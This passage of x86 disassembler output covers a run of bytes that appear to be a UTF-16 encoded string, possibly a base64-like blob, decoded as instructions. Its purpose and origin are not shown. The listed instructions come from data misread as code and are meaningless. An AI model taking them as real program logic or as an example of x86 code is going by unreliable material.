  409c66:	62 00                	bound  %eax,(%eax)
  409c68:	4d                   	dec    %ebp
  409c69:	00 31                	add    %dh,(%ecx)
  409c6b:	00 31                	add    %dh,(%ecx)
  409c6d:	00 4a 00             	add    %cl,0x0(%edx)
  409c70:	62 00                	bound  %eax,(%eax)
  409c72:	46                   	inc    %esi
  409c73:	00 6e 00             	add    %ch,0x0(%esi)
  409c76:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  409c7a:	78 00                	js     0x409c7c
  409c7c:	34 00                	xor    $0x0,%al
  409c7e:	54                   	push   %esp
  409c7f:	00 57 00             	add    %dl,0x0(%edi)
  409c82:	43                   	inc    %ebx
  409c83:	00 55 00             	add    %dl,0x0(%ebp)
  409c86:	34 00                	xor    $0x0,%al
  409c88:	4a                   	dec    %edx
  409c89:	00 78 00             	add    %bh,0x0(%eax)
  409c8c:	70 00                	jo     0x409c8e
  409c8e:	37                   	aaa
  409c8f:	00 41 00             	add    %al,0x0(%ecx)
  409c92:	57                   	push   %edi
  409c93:	00 37                	add    %dh,(%edi)
  409c95:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  409c99:	00 56 00             	add    %dl,0x0(%esi)
  409c9c:	72 00                	jb     0x409c9e
  409c9e:	4d                   	dec    %ebp
  409c9f:	00 42 00             	add    %al,0x0(%edx)
  409ca2:	6c                   	insb   (%dx),%es:(%edi)
  409ca3:	00 75 00             	add    %dh,0x0(%ebp)
  409ca6:	75 00                	jne    0x409ca8
  409ca8:	54                   	push   %esp
  409ca9:	00 73 00             	add    %dh,0x0(%ebx)
  409cac:	6d                   	insl   (%dx),%es:(%edi)
  409cad:	00 4e 00             	add    %cl,0x0(%esi)
  409cb0:	70 00                	jo     0x409cb2
  409cb2:	62 00                	bound  %eax,(%eax)
  409cb4:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  409cb8:	57                   	push   %edi
  409cb9:	00 77 00             	add    %dh,0x0(%edi)
  409cbc:	52                   	push   %edx
  409cbd:	00 67 00             	add    %ah,0x0(%edi)
  409cc0:	77 00                	ja     0x409cc2
  409cc2:	6c                   	insb   (%dx),%es:(%edi)
  409cc3:	00 69 00             	add    %ch,0x0(%ecx)
  409cc6:	63 00                	arpl   %eax,(%eax)
  409cc8:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409ccc:	34 00                	xor    $0x0,%al
  409cce:	6b 00 32             	imul   $0x32,(%eax),%eax
  409cd1:	00 68 00             	add    %ch,0x0(%eax)
  409cd4:	33 00                	xor    (%eax),%eax
  409cd6:	41                   	inc    %ecx
  409cd7:	00 4f 00             	add    %cl,0x0(%edi)
  409cda:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  409cde:	2f                   	das
  409cdf:	00 4d 00             	add    %cl,0x0(%ebp)
  409ce2:	6d                   	insl   (%dx),%es:(%edi)
  409ce3:	00 4d 00             	add    %cl,0x0(%ebp)
  409ce6:	75 00                	jne    0x409ce8
  409ce8:	37                   	aaa
  409ce9:	00 71 00             	add    %dh,0x0(%ecx)
  409cec:	31 00                	xor    %eax,(%eax)
  409cee:	55                   	push   %ebp
  409cef:	00 6f 00             	add    %ch,0x0(%edi)
  409cf2:	41                   	inc    %ecx
  409cf3:	00 4a 00             	add    %cl,0x0(%edx)
  409cf6:	43                   	inc    %ebx
  409cf7:	00 32                	add    %dh,(%edx)
  409cf9:	00 7a 00             	add    %bh,0x0(%edx)
  409cfc:	50                   	push   %eax
  409cfd:	00 35 00 41 00 73    	add    %dh,0x73004100
  409d03:	00 78 00             	add    %bh,0x0(%eax)
  409d06:	37                   	aaa
  409d07:	00 32                	add    %dh,(%edx)
  409d09:	00 70 00             	add    %dh,0x0(%eax)
  409d0c:	42                   	inc    %edx
  409d0d:	00 55 00             	add    %dl,0x0(%ebp)
  409d10:	6f                   	outsl  %ds:(%esi),(%dx)
  409d11:	00 66 00             	add    %ah,0x0(%esi)
  409d14:	58                   	pop    %eax
  409d15:	00 4b 00             	add    %cl,0x0(%ebx)
  409d18:	46                   	inc    %esi
  409d19:	00 65 00             	add    %ah,0x0(%ebp)
  409d1c:	45                   	inc    %ebp
  409d1d:	00 6f 00             	add    %ch,0x0(%edi)
  409d20:	52                   	push   %edx
  409d21:	00 41 00             	add    %al,0x0(%ecx)
  409d24:	4d                   	dec    %ebp
  409d25:	00 73 00             	add    %dh,0x0(%ebx)
  409d28:	6d                   	insl   (%dx),%es:(%edi)
  409d29:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  409d2d:	00 50 00             	add    %dl,0x0(%eax)
  409d30:	4d                   	dec    %ebp
  409d31:	00 35 00 36 00 6d    	add    %dh,0x6d003600
  409d37:	00 4d 00             	add    %cl,0x0(%ebp)
  409d3a:	56                   	push   %esi
  409d3b:	00 47 00             	add    %al,0x0(%edi)
  409d3e:	4f                   	dec    %edi
  409d3f:	00 47 00             	add    %al,0x0(%edi)
  409d42:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  409d46:	4a                   	dec    %edx
  409d47:	00 63 00             	add    %ah,0x0(%ebx)
  409d4a:	73 00                	jae    0x409d4c
  409d4c:	37                   	aaa
  409d4d:	00 49 00             	add    %cl,0x0(%ecx)
  409d50:	47                   	inc    %edi
  409d51:	00 75 00             	add    %dh,0x0(%ebp)
  409d54:	63 00                	arpl   %eax,(%eax)
  409d56:	38 00                	cmp    %al,(%eax)
  409d58:	4c                   	dec    %esp
  409d59:	00 71 00             	add    %dh,0x0(%ecx)
  409d5c:	53                   	push   %ebx
  409d5d:	00 6e 00             	add    %ch,0x0(%esi)
  409d60:	67 00 37             	add    %dh,(%bx)
  409d63:	00 43 00             	add    %al,0x0(%ebx)
  409d66:	71 00                	jno    0x409d68
  409d68:	51                   	push   %ecx
  409d69:	00 4b 00             	add    %cl,0x0(%ebx)
  409d6c:	48                   	dec    %eax
  409d6d:	00 6e 00             	add    %ch,0x0(%esi)
  409d70:	39 00                	cmp    %eax,(%eax)
  409d72:	52                   	push   %edx
  409d73:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  409d77:	00 62 00             	add    %ah,0x0(%edx)
  409d7a:	5a                   	pop    %edx
  409d7b:	00 48 00             	add    %cl,0x0(%eax)
  409d7e:	50                   	push   %eax
  409d7f:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  409d83:	00 62 00             	add    %ah,0x0(%edx)
  409d86:	57                   	push   %edi
  409d87:	00 39                	add    %bh,(%ecx)
  409d89:	00 6f 00             	add    %ch,0x0(%edi)
  409d8c:	44                   	inc    %esp
  409d8d:	00 4b 00             	add    %cl,0x0(%ebx)
  409d90:	39 00                	cmp    %eax,(%eax)
  409d92:	61                   	popa
  409d93:	00 6f 00             	add    %ch,0x0(%edi)
  409d96:	6d                   	insl   (%dx),%es:(%edi)
  409d97:	00 71 00             	add    %dh,0x0(%ecx)
  409d9a:	63 00                	arpl   %eax,(%eax)
  409d9c:	36 00 74 00 57       	add    %dh,%ss:0x57(%eax,%eax,1)
  409da1:	00 66 00             	add    %ah,0x0(%esi)
  409da4:	71 00                	jno    0x409da6
  409da6:	73 00                	jae    0x409da8
  409da8:	31 00                	xor    %eax,(%eax)
  409daa:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  409dae:	45                   	inc    %ebp
  409daf:	00 51 00             	add    %dl,0x0(%ecx)
  409db2:	6a 00                	push   $0x0
  409db4:	2f                   	das
  409db5:	00 66 00             	add    %ah,0x0(%esi)
  409db8:	52                   	push   %edx
  409db9:	00 56 00             	add    %dl,0x0(%esi)
  409dbc:	55                   	push   %ebp
  409dbd:	00 33                	add    %dh,(%ebx)
  409dbf:	00 41 00             	add    %al,0x0(%ecx)
  409dc2:	4d                   	dec    %ebp
  409dc3:	00 55 00             	add    %dl,0x0(%ebp)
  409dc6:	39 00                	cmp    %eax,(%eax)
  409dc8:	63 00                	arpl   %eax,(%eax)
  409dca:	5a                   	pop    %edx
  409dcb:	00 52 00             	add    %dl,0x0(%edx)
  409dce:	73 00                	jae    0x409dd0
  409dd0:	6c                   	insb   (%dx),%es:(%edi)
  409dd1:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  409dd5:	00 65 00             	add    %ah,0x0(%ebp)
  409dd8:	49                   	dec    %ecx
  409dd9:	00 41 00             	add    %al,0x0(%ecx)
  409ddc:	47                   	inc    %edi
  409ddd:	00 37                	add    %dh,(%edi)
  409ddf:	00 35 00 4d 00 66    	add    %dh,0x66004d00
  409de5:	00 32                	add    %dh,(%edx)
  409de7:	00 45 00             	add    %al,0x0(%ebp)
  409dea:	65 00 44 00 68       	add    %al,%gs:0x68(%eax,%eax,1)
  409def:	00 6b 00             	add    %ch,0x0(%ebx)
  409df2:	70 00                	jo     0x409df4
  409df4:	6f                   	outsl  %ds:(%esi),(%dx)
  409df5:	00 4b 00             	add    %cl,0x0(%ebx)
  409df8:	47                   	inc    %edi
  409df9:	00 36                	add    %dh,(%esi)
  409dfb:	00 58 00             	add    %bl,0x0(%eax)
  409dfe:	67 00 2f             	add    %ch,(%bx)
  409e01:	00 55 00             	add    %dl,0x0(%ebp)
  409e04:	4a                   	dec    %edx
  409e05:	00 6a 00             	add    %ch,0x0(%edx)
  409e08:	61                   	popa
  409e09:	00 75 00             	add    %dh,0x0(%ebp)
  409e0c:	48                   	dec    %eax
  409e0d:	00 41 00             	add    %al,0x0(%ecx)
  409e10:	78 00                	js     0x409e12
  409e12:	62 00                	bound  %eax,(%eax)
  409e14:	4e                   	dec    %esi
  409e15:	00 31                	add    %dh,(%ecx)
  409e17:	00 31                	add    %dh,(%ecx)
  409e19:	00 35 00 4f 00 47    	add    %dh,0x47004f00
  409e1f:	00 71 00             	add    %dh,0x0(%ecx)
  409e22:	52                   	push   %edx
  409e23:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  409e27:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  409e2b:	00 55 00             	add    %dl,0x0(%ebp)
  409e2e:	70 00                	jo     0x409e30
  409e30:	74 00                	je     0x409e32
  409e32:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  409e35:	00 55 00             	add    %dl,0x0(%ebp)
  409e38:	4a                   	dec    %edx
  409e39:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  409e3d:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  409e41:	00 6b 00             	add    %ch,0x0(%ebx)
  409e44:	37                   	aaa
  409e45:	00 68 00             	add    %ch,0x0(%eax)
  409e48:	57                   	push   %edi
  409e49:	00 4d 00             	add    %cl,0x0(%ebp)
  409e4c:	4e                   	dec    %esi
  409e4d:	00 70 00             	add    %dh,0x0(%eax)
  409e50:	52                   	push   %edx
  409e51:	00 66 00             	add    %ah,0x0(%esi)
  409e54:	7a 00                	jp     0x409e56
  409e56:	76 00                	jbe    0x409e58
  409e58:	6e                   	outsb  %ds:(%esi),(%dx)
  409e59:	00 53 00             	add    %dl,0x0(%ebx)
  409e5c:	49                   	dec    %ecx
  409e5d:	00 31                	add    %dh,(%ecx)
  409e5f:	00 55 00             	add    %dl,0x0(%ebp)
  409e62:	44                   	inc    %esp
  409e63:	00 58 00             	add    %bl,0x0(%eax)
  409e66:	57                   	push   %edi
  409e67:	00 52 00             	add    %dl,0x0(%edx)
  409e6a:	72 00                	jb     0x409e6c
  409e6c:	2f                   	das
  409e6d:	00 4a 00             	add    %cl,0x0(%edx)
  409e70:	5a                   	pop    %edx
  409e71:	00 59 00             	add    %bl,0x0(%ecx)
  409e74:	61                   	popa
  409e75:	00 4f 00             	add    %cl,0x0(%edi)
  409e78:	59                   	pop    %ecx
  409e79:	00 68 00             	add    %ch,0x0(%eax)
  409e7c:	2f                   	das
  409e7d:	00 79 00             	add    %bh,0x0(%ecx)
  409e80:	37                   	aaa
  409e81:	00 69 00             	add    %ch,0x0(%ecx)
  409e84:	6f                   	outsl  %ds:(%esi),(%dx)
  409e85:	00 68 00             	add    %ch,0x0(%eax)
  409e88:	77 00                	ja     0x409e8a
  409e8a:	62 00                	bound  %eax,(%eax)
  409e8c:	6b 00 71             	imul   $0x71,(%eax),%eax
  409e8f:	00 33                	add    %dh,(%ebx)
  409e91:	00 41 00             	add    %al,0x0(%ecx)
  409e94:	63 00                	arpl   %eax,(%eax)
  409e96:	74 00                	je     0x409e98
  409e98:	4d                   	dec    %ebp
  409e99:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  409e9d:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ea0:	70 00                	jo     0x409ea2
  409ea2:	34 00                	xor    $0x0,%al
  409ea4:	4f                   	dec    %edi
  409ea5:	00 4f 00             	add    %cl,0x0(%edi)
  409ea8:	32 00                	xor    (%eax),%al
  409eaa:	61                   	popa
  409eab:	00 48 00             	add    %cl,0x0(%eax)
  409eae:	51                   	push   %ecx
  409eaf:	00 55 00             	add    %dl,0x0(%ebp)
  409eb2:	78 00                	js     0x409eb4
  409eb4:	58                   	pop    %eax
  409eb5:	00 43 00             	add    %al,0x0(%ebx)
  409eb8:	54                   	push   %esp
  409eb9:	00 42 00             	add    %al,0x0(%edx)
  409ebc:	4c                   	dec    %esp
  409ebd:	00 6b 00             	add    %ch,0x0(%ebx)
  409ec0:	58                   	pop    %eax
  409ec1:	00 30                	add    %dh,(%eax)
  409ec3:	00 49 00             	add    %cl,0x0(%ecx)
  409ec6:	49                   	dec    %ecx
  409ec7:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  409ecb:	00 79 00             	add    %bh,0x0(%ecx)
  409ece:	78 00                	js     0x409ed0
  409ed0:	79 00                	jns    0x409ed2
  409ed2:	7a 00                	jp     0x409ed4
  409ed4:	30 00                	xor    %al,(%eax)
  409ed6:	54                   	push   %esp
  409ed7:	00 69 00             	add    %ch,0x0(%ecx)
  409eda:	6a 00                	push   $0x0
  409edc:	48                   	dec    %eax
  409edd:	00 4d 00             	add    %cl,0x0(%ebp)
  409ee0:	35 00 67 00 67       	xor    $0x67006700,%eax
  409ee5:	00 47 00             	add    %al,0x0(%edi)
  409ee8:	44                   	inc    %esp
  409ee9:	00 56 00             	add    %dl,0x0(%esi)
  409eec:	51                   	push   %ecx
  409eed:	00 2b                	add    %ch,(%ebx)
  409eef:	00 50 00             	add    %dl,0x0(%eax)
  409ef2:	42                   	inc    %edx
  409ef3:	00 4a 00             	add    %cl,0x0(%edx)
  409ef6:	66 00 50 00          	data16 add %dl,0x0(%eax)
  409efa:	6f                   	outsl  %ds:(%esi),(%dx)
  409efb:	00 56 00             	add    %dl,0x0(%esi)
  409efe:	71 00                	jno    0x409f00
  409f00:	61                   	popa
  409f01:	00 78 00             	add    %bh,0x0(%eax)
  409f04:	2b 00                	sub    (%eax),%eax
  409f06:	59                   	pop    %ecx
  409f07:	00 66 00             	add    %ah,0x0(%esi)
  409f0a:	55                   	push   %ebp
  409f0b:	00 45 00             	add    %al,0x0(%ebp)
  409f0e:	49                   	dec    %ecx
  409f0f:	00 71 00             	add    %dh,0x0(%ecx)
  409f12:	34 00                	xor    $0x0,%al
  409f14:	39 00                	cmp    %eax,(%eax)
  409f16:	35 00 38 00 30       	xor    $0x30003800,%eax
  409f1b:	00 6d 00             	add    %ch,0x0(%ebp)
  409f1e:	4d                   	dec    %ebp
  409f1f:	00 5a 00             	add    %bl,0x0(%edx)
  409f22:	73 00                	jae    0x409f24
  409f24:	53                   	push   %ebx
  409f25:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  409f29:	00 36                	add    %dh,(%esi)
  409f2b:	00 79 00             	add    %bh,0x0(%ecx)
  409f2e:	6c                   	insb   (%dx),%es:(%edi)
  409f2f:	00 42 00             	add    %al,0x0(%edx)
  409f32:	64 00 54 00 42       	add    %dl,%fs:0x42(%eax,%eax,1)
  409f37:	00 50 00             	add    %dl,0x0(%eax)
  409f3a:	39 00                	cmp    %eax,(%eax)
  409f3c:	35 00 6b 00 68       	xor    $0x68006b00,%eax
  409f41:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  409f45:	00 69 00             	add    %ch,0x0(%ecx)
  409f48:	67 00 57 00          	add    %dl,0x0(%bx)
  409f4c:	2f                   	das
  409f4d:	00 6b 00             	add    %ch,0x0(%ebx)
  409f50:	46                   	inc    %esi
  409f51:	00 33                	add    %dh,(%ebx)
  409f53:	00 69 00             	add    %ch,0x0(%ecx)
  409f56:	54                   	push   %esp
  409f57:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  409f5b:	00 37                	add    %dh,(%edi)
  409f5d:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  409f61:	00 62 00             	add    %ah,0x0(%edx)
  409f64:	7a 00                	jp     0x409f66
  409f66:	51                   	push   %ecx
  409f67:	00 79 00             	add    %bh,0x0(%ecx)
  409f6a:	70 00                	jo     0x409f6c
  409f6c:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  409f70:	59                   	pop    %ecx
  409f71:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  409f75:	00 43 00             	add    %al,0x0(%ebx)
  409f78:	59                   	pop    %ecx
  409f79:	00 39                	add    %bh,(%ecx)
  409f7b:	00 48 00             	add    %cl,0x0(%eax)
  409f7e:	48                   	dec    %eax
  409f7f:	00 52 00             	add    %dl,0x0(%edx)
  409f82:	68 00 77 00 6c       	push   $0x6c007700
  409f87:	00 33                	add    %dh,(%ebx)
  409f89:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  409f8d:	00 4f 00             	add    %cl,0x0(%edi)
  409f90:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  409f94:	6e                   	outsb  %ds:(%esi),(%dx)
  409f95:	00 55 00             	add    %dl,0x0(%ebp)
  409f98:	57                   	push   %edi
  409f99:	00 76 00             	add    %dh,0x0(%esi)
  409f9c:	54                   	push   %esp
  409f9d:	00 72 00             	add    %dh,0x0(%edx)
  409fa0:	33 00                	xor    (%eax),%eax
  409fa2:	6c                   	insb   (%dx),%es:(%edi)
  409fa3:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  409fa7:	00 70 00             	add    %dh,0x0(%eax)
  409faa:	76 00                	jbe    0x409fac
  409fac:	52                   	push   %edx
  409fad:	00 56 00             	add    %dl,0x0(%esi)
  409fb0:	48                   	dec    %eax
  409fb1:	00 51 00             	add    %dl,0x0(%ecx)
  409fb4:	6e                   	outsb  %ds:(%esi),(%dx)
  409fb5:	00 58 00             	add    %bl,0x0(%eax)
  409fb8:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  409fbc:	57                   	push   %edi
  409fbd:	00 4f 00             	add    %cl,0x0(%edi)
  409fc0:	56                   	push   %esi
  409fc1:	00 32                	add    %dh,(%edx)
  409fc3:	00 77 00             	add    %dh,0x0(%edi)
  409fc6:	63 00                	arpl   %eax,(%eax)
  409fc8:	57                   	push   %edi
  409fc9:	00 48 00             	add    %cl,0x0(%eax)
  409fcc:	6a 00                	push   $0x0
  409fce:	61                   	popa
  409fcf:	00 7a 00             	add    %bh,0x0(%edx)
  409fd2:	5a                   	pop    %edx
  409fd3:	00 6f 00             	add    %ch,0x0(%edi)
  409fd6:	50                   	push   %eax
  409fd7:	00 76 00             	add    %dh,0x0(%esi)
  409fda:	31 00                	xor    %eax,(%eax)
  409fdc:	54                   	push   %esp
  409fdd:	00 4a 00             	add    %cl,0x0(%edx)
  409fe0:	46                   	inc    %esi
  409fe1:	00 72 00             	add    %dh,0x0(%edx)
  409fe4:	46                   	inc    %esi
  409fe5:	00 65 00             	add    %ah,0x0(%ebp)
  409fe8:	33 00                	xor    (%eax),%eax
  409fea:	4e                   	dec    %esi
  409feb:	00 47 00             	add    %al,0x0(%edi)
  409fee:	69 00 46 00 6b 00    	imul   $0x6b0046,(%eax),%eax
  409ff4:	48                   	dec    %eax
  409ff5:	00 33                	add    %dh,(%ebx)
  409ff7:	00 42 00             	add    %al,0x0(%edx)
  409ffa:	54                   	push   %esp
  409ffb:	00 48 00             	add    %cl,0x0(%eax)
  409ffe:	72 00                	jb     0x40a000
  40a000:	70 00                	jo     0x40a002
  40a002:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40a006:	49                   	dec    %ecx
  40a007:	00 70 00             	add    %dh,0x0(%eax)
  40a00a:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40a00e:	4a                   	dec    %edx
  40a00f:	00 46 00             	add    %al,0x0(%esi)
  40a012:	30 00                	xor    %al,(%eax)
  40a014:	44                   	inc    %esp
  40a015:	00 57 00             	add    %dl,0x0(%edi)
  40a018:	49                   	dec    %ecx
  40a019:	00 49 00             	add    %cl,0x0(%ecx)
  40a01c:	46                   	inc    %esi
  40a01d:	00 33                	add    %dh,(%ebx)
  40a01f:	00 79 00             	add    %bh,0x0(%ecx)
  40a022:	6a 00                	push   $0x0
  40a024:	42                   	inc    %edx
  40a025:	00 63 00             	add    %ah,0x0(%ebx)
  40a028:	33 00                	xor    (%eax),%eax
  40a02a:	6b 00 30             	imul   $0x30,(%eax),%eax
  40a02d:	00 32                	add    %dh,(%edx)
  40a02f:	00 5a 00             	add    %bl,0x0(%edx)
  40a032:	47                   	inc    %edi
  40a033:	00 75 00             	add    %dh,0x0(%ebp)
  40a036:	56                   	push   %esi
  40a037:	00 6a 00             	add    %ch,0x0(%edx)
  40a03a:	57                   	push   %edi
  40a03b:	00 70 00             	add    %dh,0x0(%eax)
  40a03e:	30 00                	xor    %al,(%eax)
  40a040:	4e                   	dec    %esi
  40a041:	00 50 00             	add    %dl,0x0(%eax)
  40a044:	5a                   	pop    %edx
  40a045:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a048:	58                   	pop    %eax
  40a049:	00 77 00             	add    %dh,0x0(%edi)
  40a04c:	69 00 66 00 2f 00    	imul   $0x2f0066,(%eax),%eax
  40a052:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a055:	00 4e 00             	add    %cl,0x0(%esi)
  40a058:	69 00 38 00 52 00    	imul   $0x520038,(%eax),%eax
  40a05e:	78 00                	js     0x40a060
  40a060:	77 00                	ja     0x40a062
  40a062:	52                   	push   %edx
  40a063:	00 59 00             	add    %bl,0x0(%ecx)
  40a066:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a069:	00 62 00             	add    %ah,0x0(%edx)
  40a06c:	2f                   	das
  40a06d:	00 6e 00             	add    %ch,0x0(%esi)
  40a070:	53                   	push   %ebx
  40a071:	00 43 00             	add    %al,0x0(%ebx)
  40a074:	2b 00                	sub    (%eax),%eax
  40a076:	68 00 6d 00 61       	push   $0x61006d00
  40a07b:	00 36                	add    %dh,(%esi)
  40a07d:	00 39                	add    %bh,(%ecx)
  40a07f:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40a083:	00 41 00             	add    %al,0x0(%ecx)
  40a086:	34 00                	xor    $0x0,%al
  40a088:	49                   	dec    %ecx
  40a089:	00 5a 00             	add    %bl,0x0(%edx)
  40a08c:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40a090:	46                   	inc    %esi
  40a091:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a094:	47                   	inc    %edi
  40a095:	00 70 00             	add    %dh,0x0(%eax)
  40a098:	34 00                	xor    $0x0,%al
  40a09a:	70 00                	jo     0x40a09c
  40a09c:	55                   	push   %ebp
  40a09d:	00 4a 00             	add    %cl,0x0(%edx)
  40a0a0:	48                   	dec    %eax
  40a0a1:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a0a5:	00 33                	add    %dh,(%ebx)
  40a0a7:	00 41 00             	add    %al,0x0(%ecx)
  40a0aa:	77 00                	ja     0x40a0ac
  40a0ac:	62 00                	bound  %eax,(%eax)
  40a0ae:	46                   	inc    %esi
  40a0af:	00 32                	add    %dh,(%edx)
  40a0b1:	00 73 00             	add    %dh,0x0(%ebx)
  40a0b4:	4f                   	dec    %edi
  40a0b5:	00 30                	add    %dh,(%eax)
  40a0b7:	00 47 00             	add    %al,0x0(%edi)
  40a0ba:	37                   	aaa
  40a0bb:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0be:	69 00 2b 00 6d 00    	imul   $0x6d002b,(%eax),%eax
  40a0c4:	47                   	inc    %edi
  40a0c5:	00 48 00             	add    %cl,0x0(%eax)
  40a0c8:	52                   	push   %edx
  40a0c9:	00 56 00             	add    %dl,0x0(%esi)
  40a0cc:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  40a0d0:	35 00 72 00 54       	xor    $0x54007200,%eax
  40a0d5:	00 62 00             	add    %ah,0x0(%edx)
  40a0d8:	56                   	push   %esi
  40a0d9:	00 75 00             	add    %dh,0x0(%ebp)
  40a0dc:	71 00                	jno    0x40a0de
  40a0de:	35 00 54 00 4f       	xor    $0x4f005400,%eax
  40a0e3:	00 72 00             	add    %dh,0x0(%edx)
  40a0e6:	71 00                	jno    0x40a0e8
  40a0e8:	34 00                	xor    $0x0,%al
  40a0ea:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40a0ee:	67 00 57 00          	add    %dl,0x0(%bx)
  40a0f2:	38 00                	cmp    %al,(%eax)
  40a0f4:	42                   	inc    %edx
  40a0f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a0f8:	73 00                	jae    0x40a0fa
  40a0fa:	49                   	dec    %ecx
  40a0fb:	00 73 00             	add    %dh,0x0(%ebx)
  40a0fe:	69 00 70 00 57 00    	imul   $0x570070,(%eax),%eax
  40a104:	77 00                	ja     0x40a106
  40a106:	53                   	push   %ebx
  40a107:	00 4e 00             	add    %cl,0x0(%esi)
  40a10a:	66 00 33             	data16 add %dh,(%ebx)
  40a10d:	00 79 00             	add    %bh,0x0(%ecx)
  40a110:	78 00                	js     0x40a112
  40a112:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40a116:	59                   	pop    %ecx
  40a117:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40a11b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a11e:	4a                   	dec    %edx
  40a11f:	00 67 00             	add    %ah,0x0(%edi)
  40a122:	70 00                	jo     0x40a124
  40a124:	44                   	inc    %esp
  40a125:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a128:	54                   	push   %esp
  40a129:	00 42 00             	add    %al,0x0(%edx)
  40a12c:	58                   	pop    %eax
  40a12d:	00 2f                	add    %ch,(%edi)
  40a12f:	00 59 00             	add    %bl,0x0(%ecx)
  40a132:	44                   	inc    %esp
  40a133:	00 76 00             	add    %dh,0x0(%esi)
  40a136:	56                   	push   %esi
  40a137:	00 76 00             	add    %dh,0x0(%esi)
  40a13a:	75 00                	jne    0x40a13c
  40a13c:	45                   	inc    %ebp
  40a13d:	00 65 00             	add    %ah,0x0(%ebp)
  40a140:	5a                   	pop    %edx
  40a141:	00 77 00             	add    %dh,0x0(%edi)
  40a144:	6c                   	insb   (%dx),%es:(%edi)
  40a145:	00 4f 00             	add    %cl,0x0(%edi)
  40a148:	6b 00 39             	imul   $0x39,(%eax),%eax
  40a14b:	00 56 00             	add    %dl,0x0(%esi)
  40a14e:	32 00                	xor    (%eax),%al
  40a150:	4a                   	dec    %edx
  40a151:	00 6b 00             	add    %ch,0x0(%ebx)
  40a154:	63 00                	arpl   %eax,(%eax)
  40a156:	51                   	push   %ecx
  40a157:	00 76 00             	add    %dh,0x0(%esi)
  40a15a:	42                   	inc    %edx
  40a15b:	00 4f 00             	add    %cl,0x0(%edi)
  40a15e:	62 00                	bound  %eax,(%eax)
  40a160:	33 00                	xor    (%eax),%eax
  40a162:	44                   	inc    %esp
  40a163:	00 68 00             	add    %ch,0x0(%eax)
  40a166:	55                   	push   %ebp
  40a167:	00 75 00             	add    %dh,0x0(%ebp)
  40a16a:	63 00                	arpl   %eax,(%eax)
  40a16c:	65 00 38             	add    %bh,%gs:(%eax)
  40a16f:	00 58 00             	add    %bl,0x0(%eax)
  40a172:	54                   	push   %esp
  40a173:	00 6e 00             	add    %ch,0x0(%esi)
  40a176:	53                   	push   %ebx
  40a177:	00 4a 00             	add    %cl,0x0(%edx)
  40a17a:	6d                   	insl   (%dx),%es:(%edi)
  40a17b:	00 4f 00             	add    %cl,0x0(%edi)
  40a17e:	57                   	push   %edi
  40a17f:	00 35 00 4d 00 47    	add    %dh,0x47004d00
  40a185:	00 4f 00             	add    %cl,0x0(%edi)
  40a188:	62 00                	bound  %eax,(%eax)
  40a18a:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40a18e:	4d                   	dec    %ebp
  40a18f:	00 71 00             	add    %dh,0x0(%ecx)
  40a192:	48                   	dec    %eax
  40a193:	00 4b 00             	add    %cl,0x0(%ebx)
  40a196:	45                   	inc    %ebp
  40a197:	00 70 00             	add    %dh,0x0(%eax)
  40a19a:	54                   	push   %esp
  40a19b:	00 6a 00             	add    %ch,0x0(%edx)
  40a19e:	63 00                	arpl   %eax,(%eax)
  40a1a0:	4a                   	dec    %edx
  40a1a1:	00 41 00             	add    %al,0x0(%ecx)
  40a1a4:	33 00                	xor    (%eax),%eax
  40a1a6:	77 00                	ja     0x40a1a8
  40a1a8:	74 00                	je     0x40a1aa
  40a1aa:	72 00                	jb     0x40a1ac
  40a1ac:	4e                   	dec    %esi
  40a1ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a1b0:	55                   	push   %ebp
  40a1b1:	00 38                	add    %bh,(%eax)
  40a1b3:	00 48 00             	add    %cl,0x0(%eax)
  40a1b6:	31 00                	xor    %eax,(%eax)
  40a1b8:	57                   	push   %edi
  40a1b9:	00 4a 00             	add    %cl,0x0(%edx)
  40a1bc:	37                   	aaa
  40a1bd:	00 52 00             	add    %dl,0x0(%edx)
  40a1c0:	71 00                	jno    0x40a1c2
  40a1c2:	37                   	aaa
